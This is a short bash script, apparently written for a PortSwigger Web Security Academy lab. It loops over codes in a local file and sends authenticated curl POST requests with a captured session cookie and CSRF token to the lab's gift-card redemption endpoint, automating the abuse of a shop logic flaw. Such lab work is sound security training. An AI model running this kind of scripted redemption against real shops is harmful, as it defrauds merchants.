#!/bin/bash



for x in $(cat ./temp.txt); do
    curl --path-as-is -i -s -k \
        -H $'Host: 0a5000bc03de38318141997d001200ec.web-security-academy.net' -H $'Content-Length: 58' -H $'Cache-Control: max-age=0' -H $'Sec-Ch-Ua: \"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'Sec-Ch-Ua-Platform: \"Windows\"' -H $'Accept-Language: en-US,en;q=0.9' -H $'Origin: https://0a5000bc03de38318141997d001200ec.web-security-academy.net' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Referer: https://0a5000bc03de38318141997d001200ec.web-security-academy.net/my-account?id=wiener' -H $'Accept-Encoding: gzip, deflate, br' -H $'Priority: u=0, i' \
        -b $'session=hjf3pQvuHpFKqtgqKBDOEBfkru32b5re' \
        --data-binary $"csrf=kAWIsrAIWKG18ZV0rF6Wr8o4ZXPgv7WF&gift-card=$x" \
        $'https://0a5000bc03de38318141997d001200ec.web-security-academy.net/gift-card'
done